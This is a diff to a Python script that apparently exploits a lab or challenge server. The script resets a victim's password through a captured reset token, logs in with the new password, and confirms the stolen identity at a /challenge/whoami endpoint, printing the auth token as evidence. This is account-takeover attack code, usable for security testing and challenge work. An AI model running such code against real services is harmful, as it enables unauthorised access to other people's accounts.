@@ -104,11 +104,11 @@ def login(base_url: str, password: str) -> tuple[str, str]:
     return str(data["userId"]), str(data["authToken"])
 
 
-def prove_identity(base_url: str, material: str) -> None:
+def prove_identity(base_url: str, auth_token: str) -> None:
     """Ensure the captured token reaches the protected victim identity."""
     request = urllib.request.Request(
         f"{base_url}/challenge/whoami",
-        headers={"X-Rocket-Identity": material},
+        headers={"X-Rocket-Identity": auth_token},
     )
     with urllib.request.urlopen(request, timeout=12) as response:
         identity = json.load(response)
@@ -130,10 +130,11 @@ def main() -> None:
     if result.get("error"):
         raise RuntimeError(f"Password reset failed: {result}")
     user_id, auth_token = login(base_url, new_password)
-    material = f"{user_id}:{auth_token}"
-    prove_identity(base_url, material)
+    if not user_id:
+        raise RuntimeError("Login response returned an empty user ID")
+    prove_identity(base_url, auth_token)
     print(json.dumps({
-        "evidence_payload": {"token": material, "user": USERNAME},
+        "evidence_payload": {"token": auth_token, "user": USERNAME},
         "token_length": len(token),
         "identity_verified": True,
     }))
